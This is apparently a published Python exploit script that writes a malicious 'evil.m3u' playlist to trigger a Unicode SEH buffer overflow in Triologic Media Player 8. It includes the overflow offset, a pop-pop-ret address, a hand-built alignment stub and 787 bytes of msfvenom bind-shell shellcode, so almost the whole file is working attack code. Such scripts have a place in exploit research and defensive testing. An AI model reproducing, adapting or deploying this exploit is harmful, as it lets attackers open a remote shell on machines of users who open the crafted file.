#!/usr/bin/python

#####################################################
## WriTTen By: van6uard
## Dustin Silveri
## Unicode foolz  0041
## This script has a different process for calculating the alignment for hitting the shellcode. 
## !Mona findmsp #my friend shows offset at 536
## buffer + [nSEH] + [SEH] + remainingbuffer
## 'A'*536 + 'BB' + 'CC' + 'D'*(5000-536-2-2)
## !mona seh -cp unicode  for unicode safe pop pop rets
## need an address in the format of 004400f2
## unicode nop = \x71 or venetian padding
## 
## Log data, item 5 Address=004100F2 Message=  0x004100f2 : pop esi # pop ebx # ret 0x04 | startnull,unicode {PAGE_EXECUTE_READWRITE} [triomp8.exe] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v8.0.0.0 (C:\Program Files\Triologic\Triologic Media Player\triomp8.exe)
## 
## msfvenom -p windows/shell_bind_tcp -f python -v shellcode -a x86 --platform windows -e x86/unicode_upper BufferRegister=EAX
## Found 1 compatible encoders
## Attempting to encode payload with 1 iterations of x86/unicode_upper
## x86/unicode_upper succeeded with size 787 (iteration=0)
## x86/unicode_upper chosen with final size 787
## Payload size: 787 bytes
## Final size of python file: 4220 bytes
######################################################

filename = "evil.m3u"

align = (
"\x55"               #push the value of EBP on to the stack
"\x71"               #Venetian Padding
"\x58"               #take the value of EBP and pop it into EAX
"\x71"               #Venetian Padding
"\x05\x20\x11"       #add eax,0x11002000  \
"\x71"               #Venetian Padding    |> the net sum will add 300 to the value in EAX
"\x2d\x17\x11"       #sub eax,0x11001700  /
"\x71"               #Venetian Padding
"\x50"               #push the new value of EAX onto the stack (points to our buffer)
"\x71"               #Venetian Padding
"\xC3"               #redirect execution flow to the pointer at the top of the stack ==> EAX
)

filler = "\x58"*117

shellcode =  ""
shellcode += "\x50\x50\x59\x41\x49\x41\x49\x41\x49\x41\x49\x41"
shellcode += "\x51\x41\x54\x41\x58\x41\x5a\x41\x50\x55\x33\x51"
shellcode += "\x41\x44\x41\x5a\x41\x42\x41\x52\x41\x4c\x41\x59"
shellcode += "\x41\x49\x41\x51\x41\x49\x41\x51\x41\x50\x41\x35"
shellcode += "\x41\x41\x41\x50\x41\x5a\x31\x41\x49\x31\x41\x49"
shellcode += "\x41\x49\x41\x4a\x31\x31\x41\x49\x41\x49\x41\x58"
shellcode += "\x41\x35\x38\x41\x41\x50\x41\x5a\x41\x42\x41\x42"
shellcode += "\x51\x49\x31\x41\x49\x51\x49\x41\x49\x51\x49\x31"
shellcode += "\x31\x31\x31\x41\x49\x41\x4a\x51\x49\x31\x41\x59"
shellcode += "\x41\x5a\x42\x41\x42\x41\x42\x41\x42\x41\x42\x33"
shellcode += "\x30\x41\x50\x42\x39\x34\x34\x4a\x42\x4b\x4c\x39"
shellcode += "\x58\x34\x42\x4d\x30\x4b\x50\x4d\x30\x31\x50\x35"
shellcode += "\x39\x5a\x45\x4e\x51\x57\x50\x31\x54\x54\x4b\x42"
shellcode += "\x30\x50\x30\x54\x4b\x31\x42\x4c\x4c\x54\x4b\x31"
shellcode += "\x42\x4c\x54\x34\x4b\x43\x42\x4f\x38\x4c\x4f\x46"
shellcode += "\x57\x50\x4a\x4e\x46\x30\x31\x4b\x4f\x36\x4c\x4f"
shellcode += "\x4c\x31\x51\x53\x4c\x4b\x52\x4e\x4c\x4f\x30\x49"
shellcode += "\x31\x38\x4f\x4c\x4d\x4b\x51\x38\x47\x4a\x42\x4b"
shellcode += "\x42\x50\x52\x32\x37\x44\x4b\x30\x52\x4c\x50\x34"
shellcode += "\x4b\x50\x4a\x4f\x4c\x44\x4b\x30\x4c\x4c\x51\x33"
shellcode += "\x48\x4a\x43\x51\x38\x4d\x31\x4a\x31\x30\x51\x44"
shellcode += "\x4b\x51\x49\x4d\x50\x4b\x51\x39\x43\x44\x4b\x50"
shellcode += "\x49\x4d\x48\x39\x53\x4e\x5a\x51\x39\x44\x4b\x4f"
shellcode += "\x44\x44\x4b\x4b\x51\x48\x56\x4e\x51\x4b\x4f\x36"
shellcode += "\x4c\x59\x31\x38\x4f\x4c\x4d\x4d\x31\x38\x47\x50"
shellcode += "\x38\x4b\x30\x33\x45\x5a\x56\x4b\x53\x33\x4d\x4c"
shellcode += "\x38\x4f\x4b\x33\x4d\x4e\x44\x43\x45\x4a\x44\x50"
shellcode += "\x58\x54\x4b\x31\x48\x4f\x34\x4b\x51\x59\x43\x42"
shellcode += "\x46\x54\x4b\x4c\x4c\x50\x4b\x54\x4b\x50\x58\x4d"
shellcode += "\x4c\x4b\x51\x49\x43\x34\x4b\x4b\x54\x34\x4b\x4b"
shellcode += "\x51\x5a\x30\x45\x39\x30\x44\x4f\x34\x4f\x34\x51"
shellcode += "\x4b\x31\x4b\x33\x31\x52\x39\x50\x5a\x32\x31\x4b"
shellcode += "\x4f\x49\x50\x31\x4f\x51\x4f\x51\x4a\x44\x4b\x4c"
shellcode += "\x52\x5a\x4b\x44\x4d\x51\x4d\x53\x38\x4f\x43\x50"
shellcode += "\x32\x4b\x50\x4d\x30\x52\x48\x44\x37\x44\x33\x4f"
shellcode += "\x42\x31\x4f\x51\x44\x33\x38\x50\x4c\x32\x57\x4f"
shellcode += "\x36\x4b\x57\x4b\x4f\x49\x45\x48\x38\x36\x30\x4b"
shellcode += "\x51\x4d\x30\x4d\x30\x4e\x49\x39\x34\x31\x44\x50"
shellcode += "\x50\x42\x48\x4f\x39\x55\x30\x52\x4b\x4d\x30\x4b"
shellcode += "\x4f\x48\x55\x31\x5a\x4d\x38\x32\x39\x42\x30\x4a"
shellcode += "\x42\x4b\x4d\x51\x30\x52\x30\x31\x30\x30\x50\x52"
shellcode += "\x48\x39\x5a\x4c\x4f\x39\x4f\x39\x50\x4b\x4f\x39"
shellcode += "\x45\x34\x57\x31\x58\x4b\x52\x4b\x50\x4c\x51\x31"
shellcode += "\x4c\x34\x49\x4b\x36\x32\x4a\x4e\x30\x42\x36\x31"
shellcode += "\x47\x43\x38\x37\x52\x49\x4b\x50\x37\x42\x47\x4b"
shellcode += "\x4f\x5a\x35\x50\x57\x43\x38\x48\x37\x59\x59\x50"
shellcode += "\x38\x4b\x4f\x4b\x4f\x59\x45\x30\x57\x31\x58\x54"
shellcode += "\x34\x5a\x4c\x4f\x4b\x39\x51\x4b\x4f\x38\x55\x32"
shellcode += "\x37\x44\x57\x53\x38\x44\x35\x42\x4e\x50\x4d\x53"
shellcode += "\x31\x4b\x4f\x48\x55\x52\x48\x42\x43\x32\x4d\x43"
shellcode += "\x34\x4b\x50\x34\x49\x49\x53\x32\x37\x31\x47\x32"
shellcode += "\x37\x50\x31\x4c\x36\x42\x4a\x4e\x32\x51\x49\x30"
shellcode += "\x56\x59\x52\x4b\x4d\x43\x36\x57\x57\x31\x34\x4d"
shellcode += "\x54\x4f\x4c\x4d\x31\x4b\x51\x34\x4d\x4f\x54\x4f"
shellcode += "\x34\x4c\x50\x58\x46\x4d\x30\x50\x44\x50\x54\x32"
shellcode += "\x30\x50\x56\x31\x46\x42\x36\x50\x46\x50\x56\x50"
shellcode += "\x4e\x50\x56\x31\x46\x52\x33\x52\x36\x43\x38\x43"
shellcode += "\x49\x38\x4c\x4f\x4f\x55\x36\x4b\x4f\x5a\x35\x43"
shellcode += "\x59\x4b\x30\x30\x4e\x30\x56\x51\x36\x4b\x4f\x50"
shellcode += "\x30\x51\x58\x4d\x38\x33\x57\x4d\x4d\x43\x30\x4b"
shellcode += "\x4f\x39\x45\x37\x4b\x4a\x50\x47\x45\x46\x42\x51"
shellcode += "\x46\x33\x38\x36\x46\x36\x35\x47\x4d\x55\x4d\x4b"
shellcode += "\x4f\x48\x55\x4f\x4c\x4c\x46\x33\x4c\x4c\x4a\x43"
shellcode += "\x50\x4b\x4b\x59\x50\x53\x45\x4c\x45\x57\x4b\x31"
shellcode += "\x37\x4e\x33\x34\x32\x52\x4f\x42\x4a\x4d\x30\x32"
shellcode += "\x33\x4b\x4f\x49\x45\x41\x41"

boom = align + filler + shellcode

buffer = "A"*536 
buffer += "\x41\x71"            # [nSEH]
buffer += "\xF2\x41"            # [SEH]
buffer += boom
buffer += "D"*(5000-536-4-len(boom))

textfile = open(filename, 'w')
textfile.write(buffer)
textfile.close()
